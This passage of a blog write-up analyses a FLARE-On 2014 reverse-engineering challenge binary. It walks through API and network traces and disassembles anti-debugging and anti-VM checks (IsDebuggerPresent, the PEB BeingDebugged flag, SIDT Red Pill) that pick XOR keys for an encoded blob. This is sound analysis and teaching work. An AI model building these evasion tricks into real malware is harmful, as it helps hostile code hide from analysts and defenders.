<p>By this time we have already fallen into a pre-check routine. Filename is <code>d69650fa6d4825ec2ddeecdc6a92228d</code> (MD5 hash) and googling brings up no notable results.</p>

<p>PE-Studio stuff:</p>

<ul>
<li>Win32 executable</li>
<li>VirusTotal score: 5 / 55</li>
<li>Imported libraries: ws2_32.dll, kernel32.dll and wininet.dll. <code>wininet.dll</code> is for the interwebz</li>
<li>Imported symbols: Lots of them. Functions for creating network sockets, hostname lookups, creating, reading and writing files and general anti-debug/anti-vm stuff</li>
<li>Strings: Not as many strings as challenge 6. cmd.exe and 127.0.0.1 look interesting</li>
</ul>

<p>I used <code>API Monitor</code> to observe application&rsquo;s API calls. It crashed after a while and API Monitor flagged 230k calls. Sifting through them is not practical but a lot of them are redundant and do not look interesting. For example there are a lot of <code>LocalAlloc</code> and <code>LocalFree</code> calls. Right click any call and select <code>Exclude &gt; API Name</code> to filter it. After excluding a lot of stuff, there was still so much crap. So instead I tried to look at API calls to certain Dlls for example <code>wininet.dll</code>. Under <code>Monitored Processes</code> navigate to <code>Modules</code> and then select a specific Dll to only see its calls. Let&rsquo;s search for specific calls that we noticed in PE-Studio. API Monitor also supports searching in MSDN. Double click a call or right click and select <code>Online Help (MSDN)</code>.</p>

<p>I searched for <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx" target="_blank">gethostbyname</a> and found some interesting results:</p>

<p><img src="/images/2014/flare/7-1.jpg" alt="Dogecoin" title="Dogecoin" /></p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Calls for gethostbyname</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">gethostbyname</span> <span style="color: #93A1A1">(</span> <span style="color: #2AA198">&quot;www.dogecoin.com&quot;</span> <span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">gethostbyname</span> <span style="color: #93A1A1">(</span> <span style="color: #2AA198">&quot;e.root-servers.net&quot;</span> <span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>I was curious about these connections so I captured the traffic using <code>Wireshark</code> from launch to crash.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Traffic summary - some lines omitted</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">192.168.1.1</span>	<span style="color: #93A1A1">DNS</span>	<span style="color: #93A1A1">76</span>	<span style="color: #93A1A1">Standard</span> <span style="color: #93A1A1">query</span> <span style="color: #93A1A1">0xbbc7</span>  <span style="color: #93A1A1">A</span> <span style="color: #93A1A1">www.dogecoin.com</span>
<span style="color: #93A1A1">192.168.1.1</span>	<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">DNS</span>	<span style="color: #93A1A1">106</span>	<span style="color: #93A1A1">Standard</span> <span style="color: #93A1A1">query</span> <span style="color: #93A1A1">response</span> <span style="color: #93A1A1">0xbbc7</span>  <span style="color: #93A1A1">CNAME</span> <span style="color: #93A1A1">dogecoin.com</span> <span style="color: #93A1A1">A</span> <span style="color: #93A1A1">204.232.175.78</span>
<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">192.168.1.1</span>	<span style="color: #93A1A1">DNS</span>	<span style="color: #93A1A1">78</span>	<span style="color: #93A1A1">Standard</span> <span style="color: #93A1A1">query</span> <span style="color: #93A1A1">0xa75d</span>  <span style="color: #93A1A1">A</span> <span style="color: #93A1A1">e.root-servers.net</span>
<span style="color: #93A1A1">192.168.1.1</span>	<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">DNS</span>	<span style="color: #93A1A1">94</span>	<span style="color: #93A1A1">Standard</span> <span style="color: #93A1A1">query</span> <span style="color: #93A1A1">response</span> <span style="color: #93A1A1">0xa75d</span>  <span style="color: #93A1A1">A</span> <span style="color: #93A1A1">192.203.230.10</span>
<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">192.168.1.1</span>	<span style="color: #93A1A1">DNS</span>	<span style="color: #93A1A1">71</span>	<span style="color: #93A1A1">Standard</span> <span style="color: #93A1A1">query</span> <span style="color: #93A1A1">0x7524</span>  <span style="color: #93A1A1">A</span> <span style="color: #93A1A1">twitter.com</span>
<span style="color: #93A1A1">192.168.1.1</span>	<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">DNS</span>	<span style="color: #93A1A1">135</span>	<span style="color: #93A1A1">Standard</span> <span style="color: #93A1A1">query</span> <span style="color: #93A1A1">response</span> <span style="color: #93A1A1">0x7524</span>  <span style="color: #93A1A1">A</span> <span style="color: #93A1A1">199.16.156.198</span> <span style="color: #93A1A1">A</span> <span style="color: #93A1A1">199.16.156.70</span> <span style="color: #93A1A1">A</span> <span style="color: #93A1A1">199.16.156.6</span> <span style="color: #93A1A1">A</span> <span style="color: #93A1A1">199.16.156.102</span>
<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">199.16.156.198</span>	<span style="color: #93A1A1">TLSv1</span>	<span style="color: #93A1A1">124</span>	<span style="color: #93A1A1">Client</span> <span style="color: #93A1A1">Hello</span>
<span style="color: #93A1A1">199.16.156.198</span>	<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">TLSv1</span>	<span style="color: #93A1A1">1474</span>	<span style="color: #93A1A1">Server</span> <span style="color: #93A1A1">Hello</span>
<span style="color: #93A1A1">199.16.156.198</span>	<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">TLSv1</span>	<span style="color: #93A1A1">382</span>	<span style="color: #93A1A1">Certificate</span>
<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">199.16.156.198</span>	<span style="color: #93A1A1">TLSv1</span>	<span style="color: #93A1A1">368</span>	<span style="color: #93A1A1">Client</span> <span style="color: #93A1A1">Key</span> <span style="color: #93A1A1">Exchange,</span> <span style="color: #93A1A1">Change</span> <span style="color: #93A1A1">Cipher</span> <span style="color: #93A1A1">Spec,</span> <span style="color: #93A1A1">Encrypted</span> <span style="color: #93A1A1">Handshake</span> <span style="color: #93A1A1">Message</span>
<span style="color: #93A1A1">199.16.156.198</span>	<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">TLSv1</span>	<span style="color: #93A1A1">101</span>	<span style="color: #93A1A1">Change</span> <span style="color: #93A1A1">Cipher</span> <span style="color: #93A1A1">Spec,</span> <span style="color: #93A1A1">Encrypted</span> <span style="color: #93A1A1">Handshake</span> <span style="color: #93A1A1">Message</span>
<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">199.16.156.198</span>	<span style="color: #93A1A1">TLSv1</span>	<span style="color: #93A1A1">260</span>	<span style="color: #93A1A1">Application</span> <span style="color: #93A1A1">Data</span>
<span style="color: #93A1A1">199.16.156.198</span>	<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">TLSv1</span>	<span style="color: #93A1A1">1431</span>	<span style="color: #93A1A1">Application</span> <span style="color: #93A1A1">Data</span>
<span style="color: #93A1A1">199.16.156.198</span>	<span style="color: #93A1A1">10.0.2.15</span>	<span style="color: #93A1A1">TLSv1</span>	<span style="color: #93A1A1">1474</span>	<span style="color: #93A1A1">Application</span> <span style="color: #93A1A1">Data</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Query for <code>www.dogecoin.com</code>, <code>e.root-servers.net</code> and <code>www.twitter.com</code>. Then TLS handshake in lines 7-11 and finally a request to twitter (line 12) and reply (lines 13-14). Let&rsquo;s search for &ldquo;twitter&rdquo; in API Monitor and we see this <code>InternetOpenUrlW ( 0x00cc0004, &quot;https://twitter.com/FireEye/status/484033515538116608&quot;, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_PRAGMA_NOCACHE, 0 )</code>. Let&rsquo;s find that tweet and it looks normal.</p>

<p><img src="/images/2014/flare/7-2.jpg" alt="When embed tweet plugins for Octopress don't work" title="When embed tweet plugins for Octopress don't work" /></p>

<p>After migrating to <a href="https://gohugo.io" target="_blank">Hugo</a>, I can embed tweets now.</p>

<p><blockquote class="twitter-tweet"><p lang="en" dir="ltr">The Service You Can’t Refuse: A Secluded HijackRAT <a href="http://t.co/ckx18JHdkb">http://t.co/ckx18JHdkb</a> <a href="https://twitter.com/hashtag/infosec?src=hash">#infosec</a> <a href="https://twitter.com/hashtag/malware?src=hash">#malware</a></p>&mdash; FireEye (@FireEye) <a href="https://twitter.com/FireEye/status/484033515538116608">July 1, 2014</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></p>

<p>Because this challenge employs a good number of Anti-Debug/Anti-VM protections, I will try to explain what I learned at each stage. Even after finishing the challenge I went back and looked at some steps again to learn more.</p>

<p>Here are some useful resources:</p>

<ul>
<li><p><a href="http://pferrie.host22.com/papers/antidebug.pdf" target="_blank">The &ldquo;Ultimate&rdquo; Anti-Debugging Reference (PDF)</a> by <code>Peter Ferrie</code>. I had to remind myself what year it was after I visited <a href="http://pferrie.host22.com/" target="_blank">his website</a></p></li>

<li><p><a href="http://practicalmalwareanalysis.com/" target="_blank">Practical Malware Analysis book</a> chapters 16 and 17 deal with Anti-Debugging and Anti-VM techniques</p></li>

<li><p><a href="https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/" target="_blank">Five Anti-Analysis Tricks That Sometimes Fool Analysts</a> was published when I was writing this post</p></li>
</ul>

<p>Find <code>main</code> and put a breakpoint on it. As we go through main we reach a bunch of function calls. Let&rsquo;s start with the first one.</p>

<h4 id="function-1-isdebuggerpresent:94bf06dd1bee42f6b34a1ff79274f7e7">Function 1 - isDebuggerPresent?</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401030</span>   <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4010C0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401130</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4011D0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4012A0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401350</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4013F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401460</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4014F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401590</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p><img src="/images/2014/flare/7-3.jpg" alt="isDebuggerPresent" title="isDebuggerPresent" /></p>

<p>The result of a function call <code>isDebuggerPresent</code> is compared with 0 by <code>test eax, eax</code>. This function will return 1 if the application is being debugged. In our case it will return 1 and the jump fails. Before the compare we see a value <code>0x106240</code> or <code>1073728</code> is loaded into <code>esi</code>. On both sides we see a string being loaded and then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing <code>oh happy dayz</code> with the data at <code>byte_4131F8</code>. If we reach the end of the string it will restart from the first character. This loop will go on for <code>1073728</code> bytes which seems to be length of data starting at <code>byte_4131F8</code>. I am going to rename it to <code>blob</code> and the number <code>0x106240</code> to <code>blob_length</code>.</p>

<p>If debugger is present, we go left and the string <code>oh happy dayz</code> is xor-ed with the blob. If no debugger is present, we jump to the right branch and string <code>the final countdown</code> is xor-ed with the <code>blob</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>isDebuggerPresent</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">if</span> <span style="color: #93A1A1">(isDebuggerPresent):</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;oh happy dayz&quot;</span><span style="color: #93A1A1">)</span>
<span style="color: #719e07">else</span><span style="color: #93A1A1">:</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;the final countdown&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-2-beingdebugged:94bf06dd1bee42f6b34a1ff79274f7e7">Function 2 - BeingDebugged?</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4010C0</span>    <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401130</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4011D0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4012A0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401350</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4013F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401460</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4014F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401590</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Let&rsquo;s forget about the first compare and look at the outcome. Something is being compared with 1. If the compare succeeds then the first jump happens and we skip reseting <code>var_4</code> to zero. The next jump will only happen if <code>var_4</code> is zero which means that the last jump should not have happened. If the first compare succeeds (meaning <code>[eax+2]</code> is 1) then we go left and otherwise right.</p>

<p><img src="/images/2014/flare/7-4.jpg" alt="BeingDebugged" title="BeingDebugged" /></p>

<p>In both cases a string <code>UNACCEPTABLE!</code> or <code>omglob</code> are loaded along with address <code>byte_4131F8</code> before a function call <code>sub_401000</code>. The address points to a long stream of data.</p>

<p><img src="/images/2014/flare/7-5.jpg" alt="blob" title="blob" /></p>

<p>Looking inside <code>sub_401000</code>. At the start <code>blob_length</code> is loaded into <code>ecx</code>. Then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing <code>UNACCEPTABLE!</code> with the data at <code>byte_4131F8</code>. If we reach the end of the string it will restart from the first character. This loop will go on for <code>1073728</code> bytes which seems to be length of data starting at <code>byte_4131F8</code>. So <code>sub_401000</code> is <code>string xor blob</code>.</p>

<p><img src="/images/2014/flare/7-6.jpg" alt="xor function" title="xor function" /></p>

<p>Now let&rsquo;s go back to the first compare.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:004010</span><span style="color: #268BD2">C6</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">1</span>
<span style="color: #93A1A1">.text:004010</span><span style="color: #268BD2">CD</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #268BD2">large</span> <span style="color: #B58900">fs</span><span style="color: #93A1A1">:</span><span style="color: #2AA198">30h</span>
<span style="color: #93A1A1">.text:004010</span><span style="color: #268BD2">D3</span> <span style="color: #268BD2">cmp</span>     <span style="color: #DC322F">byte</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">eax</span><span style="color: #719e07">+</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">1</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>What is the significance of <code>fs:30h</code>? It is the <code>Process Environment Block (PEB)</code> in the <code>Thread Information Block (TIB)</code>. According to <a href="http://msdn.microsoft.com/en-gb/library/windows/desktop/aa813706%28v=vs.85%29.aspx" target="_blank">MSDN</a> it has the following structure. The application is comparing the 3rd byte with 1. The 3rd byte is called <code>BeingDebugged</code> and is set to 1 if the application is being debugged. If we are running the application with a debugger it will be set to 1 and <code>UNACCEPTABLE!</code> will be xor-ed with the <code>blob</code> otherwise <code>omglob</code>. More information about the <code>PEB</code> can be found in the first section of the PDF <code>1.NtGlobalFlag</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>PEB Structure</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">typedef</span> <span style="color: #719e07">struct</span> <span style="color: #93A1A1">_PEB</span> <span style="color: #93A1A1">{</span>
  <span style="color: #93A1A1">BYTE</span>                          <span style="color: #93A1A1">Reserved1[</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">];</span>
  <span style="color: #93A1A1">BYTE</span>                          <span style="color: #93A1A1">BeingDebugged;</span>
  <span style="color: #93A1A1">BYTE</span>                          <span style="color: #93A1A1">Reserved2[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">];</span>
  <span style="color: #93A1A1">PVOID</span>                         <span style="color: #93A1A1">Reserved3[</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">];</span>
  <span style="color: #93A1A1">PPEB_LDR_DATA</span>                 <span style="color: #93A1A1">Ldr;</span>
  <span style="color: #93A1A1">PRTL_USER_PROCESS_PARAMETERS</span>  <span style="color: #93A1A1">ProcessParameters;</span>
  <span style="color: #93A1A1">BYTE</span>                          <span style="color: #93A1A1">Reserved4[</span><span style="color: #2AA198">104</span><span style="color: #93A1A1">];</span>
  <span style="color: #93A1A1">PVOID</span>                         <span style="color: #93A1A1">Reserved5[</span><span style="color: #2AA198">52</span><span style="color: #93A1A1">];</span>
  <span style="color: #93A1A1">PPS_POST_PROCESS_INIT_ROUTINE</span> <span style="color: #93A1A1">PostProcessInitRoutine;</span>
  <span style="color: #93A1A1">BYTE</span>                          <span style="color: #93A1A1">Reserved6[</span><span style="color: #2AA198">128</span><span style="color: #93A1A1">];</span>
  <span style="color: #93A1A1">PVOID</span>                         <span style="color: #93A1A1">Reserved7[</span><span style="color: #2AA198">1</span><span style="color: #93A1A1">];</span>
  <span style="color: #93A1A1">ULONG</span>                         <span style="color: #93A1A1">SessionId;</span>
<span style="color: #93A1A1">}</span> <span style="color: #93A1A1">PEB,</span> <span style="color: #719e07">*</span><span style="color: #93A1A1">PPEB;</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>At this point we can rewrite this function in Python</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>BeingDebugged</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">if</span> <span style="color: #93A1A1">(BeingDebugged):</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;UNACCEPTBALE!&quot;</span><span style="color: #93A1A1">)</span>
<span style="color: #719e07">else</span><span style="color: #93A1A1">:</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;omglob&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-3-vmware-detection-via-red-pill:94bf06dd1bee42f6b34a1ff79274f7e7">Function 3 - VMware Detection via Red Pill</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">calls_isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BeingDebugged</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401130</span>       <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4011D0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4012A0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401350</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4013F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401460</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4014F0</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401590</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p><img src="/images/2014/flare/7-7.jpg" alt="SIDT Red Pill" title="SIDT Red Pill" /></p>

<p>Jumping into <code>sub_401130</code> we see an old anti-VM technique. This is called <a href="http://repo.hackerzvoice.net/depot_ouah/Red_%20Pill.html" target="_blank">The Red Pill</a>. Each CPU core has its own <code>Interrupt Descriptor Table (IDT}</code>. IDT is essentially an interrupt vector table. Because the VM manager is juggling two operating systems but there is one location per core, it has to relocate IDT of guest OS in memory. The application can check this location for known addresses assigned by VM managers and determine if it is running in a VM.</p>

<p>But how is this accomplished? Each core has one register called the <code>Interrupt Descriptor Table Register (IDTR)</code> that points to this location in memory. The userland (ring3) instruction<code>SIDT</code> will save this register. VM managers store the relocated tables in different places and the value of this register can act as a VM manager fingerprint.</p>

<p>According to <a href="http://vrt-blog.snort.org/2009/10/how-does-malware-know-difference.html" target="_blank">this post</a> by Alain Zidouemba these are some of the addresses:</p>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">|
| VM Manager |   Address  |
|------------|------------|
| Windows    | 0x80FFFFFF |
| Virtual PC | 0xE8XXXXXX |
| VMware     | 0xFFXXXXXX |
|
</pre></div>

<p>


    

<figure class="code">
  <figcaption>
  	<span>SIDT Red Pill</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401138</span> <span style="color: #268BD2">sidt</span>    <span style="color: #268BD2">fword</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_8</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:0040113</span><span style="color: #268BD2">C</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edi</span><span style="color: #93A1A1">,</span> <span style="color: #DC322F">dword</span> <span style="color: #268BD2">ptr</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_8</span><span style="color: #719e07">+</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">]</span> <span style="color: #586E75">; edi = IDT address (in this run 0xBAB3C590)</span>
<span style="color: #93A1A1">.text:0040113</span><span style="color: #268BD2">F</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">esi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">bl</span><span style="color: #268BD2">ob_length</span> <span style="color: #586E75">; 0x106240</span>
<span style="color: #93A1A1">.text:00401145</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">edi</span>                     <span style="color: #586E75">; eax = edi = IDT address</span>
<span style="color: #93A1A1">.text:00401147</span> <span style="color: #268BD2">and</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0FF000000h</span>              <span style="color: #586E75">; Getting the first byte of address</span>
<span style="color: #93A1A1">.text:0040114</span><span style="color: #268BD2">C</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ecx</span>
